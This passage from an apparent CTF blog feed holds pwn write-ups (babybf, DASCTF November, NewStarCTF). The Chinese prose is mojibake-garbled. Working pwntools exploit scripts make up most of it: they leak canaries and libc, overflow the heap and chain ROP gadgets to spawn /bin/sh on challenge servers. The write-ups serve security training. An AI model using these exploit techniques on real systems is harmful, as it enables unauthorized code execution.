class="hljs-string">&#x27;&#x27;&#x27;</span><br>shellcode=asm(shellcode)<br>se(shellcode.ljust(<span class="hljs-number">0x2c</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>)+p32(elf.bss()))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="è°ƒè¯•">è°ƒè¯•</h3><p>å¯åŠ¨æ—¶è®¾ç½®å‚æ•°-g 8888 å¼€å¯8888ç«¯å£</p><p>å¦‚<code>qemu-arm -g 8888 -L /usr/arm-linux-gnueabi/ ./chall</code></p><p>æ¥ç€ç”¨</p><p><code>gdb-multiarch</code></p><p>è®¾ç½®æ¶æ„</p><p><code>set architecture arm</code></p><p>è¿æ¥ç«¯å£</p><p><code>target remote localhost:8888</code></p><h2 id="babybf">babybf</h2><p>èµ›ååˆ†æäº†ä¸‹ï¼Œå‘ç°æ˜¯ä¸€é“å¾ˆæœ‰æ„æ€çš„é¢˜ç›®</p><blockquote><p>Brainfuckæ˜¯ä¸€ç§æå°åŒ–çš„è®¡ç®—æœºè¯­è¨€ï¼Œå®ƒæ˜¯ç”±Urban MÃ¼lleråœ¨1993å¹´åˆ›å»ºçš„ã€‚ç”±äºfuckåœ¨è‹±è¯­ä¸­æ˜¯è„è¯ï¼Œè¿™ç§è¯­è¨€æœ‰æ—¶è¢«ç§°ä¸ºbrainf*ckæˆ–brainf**kï¼Œç”šè‡³è¢«ç®€ç§°ä¸ºBFã€‚</p></blockquote><p>å…¶å®æœ¬é¢˜æ˜¯ä¸€ä¸ªcè¯­è¨€å®ç°çš„Brainfuckè¯­è¨€çš„è§£é‡Šå™¨ï¼Œå°±æ˜¯è®©æˆ‘ä»¬è¾“å…¥Brainfuckè¯­è¨€å»pwn</p><h3 id="åˆ†æï¼š-2">åˆ†æï¼š</h3><p>å½“ç„¶æˆ‘ä»¬ä¸€å¼€å§‹å•¥éƒ½ä¸çŸ¥é“ï¼Œidaæ‰“å¼€ç¨‹åºï¼Œä¸»è¦åˆ†æè¿™é‡Œçš„æ•°ç»„</p><p><img src="/2022/11/28/2022%E5%AE%89%E6%B4%B5%E6%9D%AF/6.png" alt="6"></p><p>è¿™é‡ŒæŠŠæˆ‘ä»¬è¾“å…¥çš„codeå½“ä½œæ•°ç»„çš„ä¸‹æ ‡è¿›å»è½¬æ¢</p><p>æˆ‘ä»¬çœ‹è¿™ä¸ªæ•°ç»„æ˜¯å•¥ä¸œè¥¿</p><p><img src="/2022/11/28/2022%E5%AE%89%E6%B4%B5%E6%9D%AF/7.png" alt="7"></p><p>æˆ‘ä»¬è¦è½¬æ¢åˆ°è¿™äº›00~08çš„å€¼çš„è¯å°±è¦é€ä¸€äº›ç‰¹å®šçš„å­—ç¬¦</p><p>å…¶å®è¿™é‡Œç›¸å½“äºå¯¹åº”é€‰é¡¹v4[0~8],å»æ‰§è¡Œä¸€äº›å‘½ä»¤</p><p><img src="/2022/11/28/2022%E5%AE%89%E6%B4%B5%E6%9D%AF/8.png" alt="8"></p><p>æˆ‘ä»¬è®¡ç®—ä¸€ä¸‹åœ°å€å¯ä»¥å¾—åˆ°å¯¹åº”çš„å­—ç¬¦</p><blockquote><p>ä¾‹ï¼š0ï¼š(0x2110-0x2020)/4=0x3c=â€œ&lt;â€</p></blockquote><p>æ€»ç»“å¯å¾—:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0</span>:\x3c --&gt;<span class="hljs-string">&quot;&lt;&quot;</span><br><span class="hljs-number">1</span>:\x3e --&gt;<span class="hljs-string">&quot;&gt;&quot;</span><br><span class="hljs-number">2</span>:\x2b --&gt;<span class="hljs-string">&quot;+&quot;</span><br><span class="hljs-number">3</span>:\x2d --&gt;<span class="hljs-string">&quot;-&quot;</span><br><span class="hljs-number">4</span>:\x2e --&gt;<span class="hljs-string">&quot;.&quot;</span><br><span class="hljs-number">5</span>:\x2c --&gt;<span class="hljs-string">&quot;,&quot;</span><br><span class="hljs-number">6</span>:\x5b --&gt;<span class="hljs-string">&quot;[&quot;</span><br><span class="hljs-number">7</span>:\x5d --&gt;<span class="hljs-string">&quot;]&quot;</span><br><span class="hljs-number">8</span>:\x00<br></code></pre></td></tr></table></figure><p>è¿™å…¶å®å°±æ˜¯Brainfuckè¯­è¨€çš„å­—ç¬¦æ ‡è¯†</p><blockquote><p>Brainfuckç¨‹åºå¯ä»¥ç”¨ä¸‹é¢çš„æ›¿æ¢æ–¹æ³•ç¿»è¯‘æˆCè¯­è¨€ï¼ˆè¿™é¢˜ptræ˜¯åœ¨æ ˆä¸Šï¼‰ï¼š</p><table><thead><tr><th style="text-align:left">Brainfuck</th><th>C</th></tr></thead><tbody><tr><td style="text-align:left">&gt;</td><td>++ptr;</td></tr><tr><td style="text-align:left">&lt;</td><td>â€“ptr;</td></tr><tr><td style="text-align:left">+</td><td>++*ptr;</td></tr><tr><td style="text-align:left">-</td><td>â€“*ptr;</td></tr><tr><td style="text-align:left">.</td><td>putchar(*ptr);</td></tr><tr><td style="text-align:left">,</td><td>*ptr =getch();</td></tr><tr><td style="text-align:left">[</td><td>while (*ptr) {</td></tr><tr><td style="text-align:left">]</td><td>}</td></tr></tbody></table></blockquote><h3 id="åˆ©ç”¨ï¼š">åˆ©ç”¨ï¼š</h3><p>è¿™é¢˜æ¼æ´åœ¨æ•°ç»„è¶Šç•Œï¼Œæ²¡å¯¹ä¸‹æ ‡åšæ£€æŸ¥</p><p>æˆ‘ä»¬é€šè¿‡è°ƒè¯•å¯å¾—åˆå§‹ä½ç½®ptråœ¨<code>0x7fffe0c1eb60</code></p><p><img src="/2022/11/28/2022%E5%AE%89%E6%B4%B5%E6%9D%AF/9.png" alt="9"></p><p>åœ¨æ ˆä¸Šçš„å›ºå®šåç§»å¦‚ä¸‹</p><p><img src="/2022/11/28/2022%E5%AE%89%E6%B4%B5%E6%9D%AF/10.png" alt="10"></p><p>æ¥ä¸‹æ¥å°±å¥½åšäº†ï¼Œ(åç§»0x20)æ³„éœ²libcï¼Œ(åç§»0x38)å†™ropåˆ°retå¤„æ‰§è¡Œsystem(â€œ/bin/shâ€)</p><h3 id="Exp">Exp:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./chall&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25904</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-comment">#-----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">content</span>):<br>    sla(<span class="hljs-string">&quot;len&gt; &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>    sea(<span class="hljs-string">&quot;code&gt; &quot;</span>,content)<br><span class="hljs-comment">#------------------------</span><br><span class="hljs-comment">#debug()</span><br>cmd(<span class="hljs-string">&quot;&gt;&quot;</span>*<span class="hljs-number">0x20</span>+<span class="hljs-string">&quot;.&gt;.&gt;.&gt;.&gt;.&gt;.&quot;</span>)<br>libc_base=uu64(ru(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:])-<span class="hljs-number">0x401B40</span><br>info(<span class="hljs-string">&quot;libc_base&quot;</span>,libc_base)<br>pop_rdi = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rdi\nret&#x27;</span>)))<br>system=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh=libc_base+libc.search(<span class="hljs-string">&quot;/bin/sh&quot;</span>).<span class="hljs-built_in">next</span>()<br>ret = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;ret&#x27;</span>)))<br><br>payload=flat(ret,pop_rdi,binsh,system)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(payload))<br>cmd(<span class="hljs-string">&quot;&gt;&quot;</span>*<span class="hljs-number">0x38</span>+<span class="hljs-string">&quot;,&gt;&quot;</span>*(<span class="hljs-built_in">len</span>(payload)-<span class="hljs-number">1</span>)+<span class="hljs-string">&#x27;,&#x27;</span>)<br>r.send(payload)<br><br>r.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>arm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DASCTF NOV Xè”åˆå‡ºé¢˜äºº2022å¹´åº¦ç§¯åˆ†æ¦œäº‰å¤ºèµ›pwn</title>
    <link href="/2022/11/28/2022DAS11/"/>
    <url>/2022/11/28/2022DAS11/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€ï¼š">å‰è¨€ï¼š</h2><p>è¿™å‘¨æ¯”èµ›å’Œå®‰æ´µçš„å†²çªäº†ï¼Œèœé¸¡åšäº†ä¸ªç­¾åˆ°é¢˜ï¼Œåç»­é¢˜ç›®æ¥å¤ç°ä¸‹</p><p><img src="/2022/11/28/2022DAS11/1.png" alt="1"></p><h2 id="ç­¾ä¸ªåˆ°">ç­¾ä¸ªåˆ°</h2><p>é¦–å…ˆä¸€å¼€å§‹æˆ‘ä»¬æ•°9ä¸ªcharè¦†ç›–canaryæœ€åä¸¤ä¸ªä½èƒ½æŠŠcanaryæ³„éœ²</p><p><img src="/2022/11/28/2022DAS11/3.png" alt="3"></p><p>å…¶æ¬¡ï¼Œæ¼æ´å­˜åœ¨äºè¾“å…¥å‡½æ•°é‡Œï¼Œå¦‚æœæˆ‘ä»¬çš„sizeè¾“å…¥ä¸º0çš„è¯-1å°±æ˜¯ä¸€ä¸ªæå¤§å€¼,å¯ä»¥å †æº¢å‡º</p><p><img src="/2022/11/28/2022DAS11/2.png" alt="2"></p><p>æ­£å¸¸è¯»å†™çš„è¯ç¬¬äºŒä¸ª<code>strncmp</code>æ˜¯æ»¡è¶³ä¸äº†çš„,å› ä¸ºä½å››å­—èŠ‚å›ºå®šä¸º<code>0x00000886</code></p><p>å¯ä»¥å †æº¢å‡ºæ”¹ä¸‹ä¸€ä¸ªå †çš„fdä¸ºcanaryå³å¯</p><p><img src="/2022/11/28/2022DAS11/4.png" alt="4"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./pwn_5&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27791</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-comment">#------------------------</span><br>sea(<span class="hljs-string">&quot;who are u?\n&quot;</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">9</span>)<br>ru(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">9</span>)<br>canary=uu64(rc(<span class="hljs-number">7</span>))*<span class="hljs-number">2</span>**<span class="hljs-number">8</span><br>info(<span class="hljs-string">&quot;canary&quot;</span>,canary)<br>low_canary=canary&amp;<span class="hljs-number">0xffffffff</span><br>sl(<span class="hljs-string">&quot;1&quot;</span>)<br>sla(<span class="hljs-string">&quot;power length: &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0x0</span>))<br>sla(<span class="hljs-string">&quot;name: &quot;</span>,p64(canary)+p32(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x20d51</span>)+p64(canary))<br>sl(<span class="hljs-string">&quot;1&quot;</span>)<br>sla(<span class="hljs-string">&quot;power length: &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0x10</span>))<br><span class="hljs-comment">#debug()</span><br>sla(<span class="hljs-string">&quot;name: &quot;</span>,p64(canary))<br>sl(<span class="hljs-string">&quot;2&quot;</span>)<br><span class="hljs-comment">#debug()</span><br>sea(<span class="hljs-string">&quot;data: &quot;</span>,p64(canary))<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="heapmaster-ä¸ä¼š">heapmaster(ä¸ä¼š)</h2><p>libc2.31 ï¼Œä¿æŠ¤å…¨å¼€ï¼Œå¼€å¯äº†æ²™ç›’èƒ½ç”¨orwï¼Œmprotectã€‚</p><p>æ¯ç§åŠŸèƒ½æœ‰æ¬¡æ•°é™åˆ¶add6æ¬¡ï¼Œdelete4æ¬¡,show4æ¬¡,edit4æ¬¡ï¼Œç¬¬ä¸€æ¬¡addèƒ½ç”³è¯·0x510,åç»­addåªèƒ½0x20ï¼Œä¸”indexä¸º0ï¼Œ1æ—¶ä¼šé™„å¸¦åˆ†é…0x20,æŒ‡é’ˆæ•°ç»„åªç»´æŠ¤index 0ï¼Œ1çš„ptrå’Œsize</p><p>deleteåŠŸèƒ½å­˜åœ¨uafï¼Œåªå¯¹0ï¼Œ1 indexæœ‰æ•ˆã€‚</p><p>æˆ‘ä»¬èƒ½å¾ˆè½»æ˜“çš„åˆ©ç”¨uafå’Œshowæ¥æ³„éœ²libc_baseå’Œheap_baseã€‚</p><p>å¯ä»¥æƒ³åˆ°çš„å¤§è‡´æµç¨‹ï¼šå¦‚æœèƒ½ä»»æ„åœ°å€å†™ä»»æ„å€¼ï¼Œé‚£æˆ‘ä»¬åˆ†é…åˆ°free_hookï¼Œå†™å…¥setcontextï¼Œæ‰§è¡Œorwè¯»å–flag</p><p>é—®é¢˜æ˜¯æˆ‘å¦‚æœç”¨tcache doublefreeæ¥tcache poisonï¼Œè™½ç„¶èƒ½åˆ†é…åˆ°free_hook,ä½†å› ä¸ºæŒ‡é’ˆæ•°ç»„åªç»´æŠ¤index 0ï¼Œ1çš„å †,æˆ‘æ²¡æ³•å¾€free_hooké‡Œå†™å€¼ã€‚æˆ–è€…å¦‚æœèƒ½æœ‰ä»€ä¹ˆåŠæ³•æ§åˆ¶æŒ‡é’ˆæ•°ç»„ä¹Ÿèƒ½è§£é¢˜ã€‚ä½†æˆ‘ç¡®å®ä¸ä¼šï¼Œå°è®°ä¸€ä¸‹,ä»¥åè¿˜æ˜¯ä¸å¤ç°è¿™ç§æ²¡wpçš„é¢˜ï¼Œä¸ä¼šå°±æ²¡æ³•äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25904</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-comment">#---------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    sla(<span class="hljs-string">&quot;choice &gt;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&quot;Size: &quot;</span>,<span class="hljs-built_in">str</span>(size))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    sla(<span class="hljs-string">&quot;choice &gt;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,data</span>):<br>    sla(<span class="hljs-string">&quot;choice &gt;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-built_in">str</span>(index))<br>    sea(<span class="hljs-string">&quot;Data: &quot;</span>,data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    sla(<span class="hljs-string">&quot;choice &gt;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    sla(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#------------------------</span><br>add(<span class="hljs-number">0x500</span>)<span class="hljs-comment">#0  </span><br>delete(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)      <br>ru(<span class="hljs-string">&quot;Data is : &quot;</span>)<br>main_arena_96=uu64(ru(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:])<br>libc_base=main_arena_96-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]-<span class="hljs-number">96</span>-<span class="hljs-number">0x10</span><br>info(<span class="hljs-string">&quot;libc_base&quot;</span>,libc_base)<br>malloc_hook=libc_base+libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>free_hook=libc_base+libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>] + <span class="hljs-number">61</span><br><br>add(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#1</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>show(<span class="hljs-number">0</span>)<br>ru(<span class="hljs-string">&quot;aaaaaaaaaaaaaaaa&quot;</span>)<br>heap_base=uu64(rc(<span class="hljs-number">6</span>))-<span class="hljs-number">0x12a0</span><br>info(<span class="hljs-string">&quot;heap_base&quot;</span>,heap_base)<br><br>delete(<span class="hljs-number">1</span>)<br><br>debug()<br>r.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>heap overflow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022NewStarCTF PWN</title>
    <link href="/2022/11/16/newstarctf2022/"/>
    <url>/2022/11/16/newstarctf2022/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€ï¼š">å‰è¨€ï¼š</h2><p>ä»Šå¹´9~10æœˆçš„æ¯”èµ›ï¼Œé¢˜ç›®ä»æ˜“åˆ°éš¾,çŸ¥è¯†é¢å¹¿ï¼Œè¿˜æ˜¯å¾ˆä¸é”™çš„ï¼Œä¸»è¦æœ€è¿‘ä¸å¤ªæƒ³å­¦kernel pwnï¼Œæœ‰ç©ºå°±æ¥å¤ç°ä¸€ä¸‹è¿™æ¯”èµ›çš„pwn</p><h2 id="WEEK1">WEEK1</h2><h3 id="ret2textï¼š">ret2textï¼š</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r= process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-comment">#r=remote(&#x27;node4.buuoj.cn&#x27;,25509)</span><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-comment">#libc=elf(&#x27;./libc-2.31.so&#x27;)</span><br>pop_rdi=<span class="hljs-number">0x4007d3</span><br>backdoor=<span class="hljs-number">0x400708</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(backdoor)<br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="calcï¼š">calcï¼š</h3><p>ç”¨pythonçš„evalå‡½æ•°è‡ªåŠ¨è®¡ç®—</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 